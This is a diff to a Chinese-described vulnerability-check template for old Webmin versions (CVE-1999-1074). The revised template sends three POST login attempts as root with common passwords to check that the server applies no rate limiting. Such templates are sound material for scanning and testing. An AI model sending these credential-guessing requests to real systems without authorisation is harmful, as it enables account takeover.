@@ -1,10 +1,14 @@
 [info]
-author = "AVE"
-description = "检测 Webmin 0.5 之前版本是否存在登录暴力破解漏洞，通过发送登录请求验证服务器是否对失败登录次数进行限制"
+author = "ave"
+description = "Webmin 0.5之前版本未限制同一用户名无效密码尝试次数，通过HTTP POST向/login提交多组密码，验证服务器未触发速率限制或账户锁定机制"
 id = "POC-AVE-1999-0921"
-name = "Webmin 密码暴力破解漏洞 PoC"
+name = "Webmin 0.5之前版本暴力破解密码权限提升漏洞 PoC"
 severity = "high"
-tags = ["cve-1999-1074"]
+tags = [
+    "cve-1999-1074",
+    "webmin",
+    "brute-force",
+]
 vuln_id = [
     "CVE-1999-1074",
     "AVE-1999-0921",
@@ -15,15 +19,16 @@ logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/session_login.cgi"
+path = "/{{BaseURL}}/login"
 protocol = "http"
 
 [poc.requests.body]
-content = "user=admin&pass=wrongpass"
-type = "form"
+content = "user=root&pass=admin"
+type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
@@ -33,21 +38,50 @@ words = [
     "Login failed",
     "Failed",
     "error",
-    "incorrect",
 ]
 
 [[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/"
+method = "POST"
+path = "/{{BaseURL}}/login"
 protocol = "http"
+
+[poc.requests.body]
+content = "user=root&pass=123456"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "Webmin",
-    "Login",
-    "Please enter",
-    "session_login",
+    "Login failed",
+    "Failed",
+    "error",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=root&pass=password"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Login failed",
+    "Failed",
+    "error",
 ]
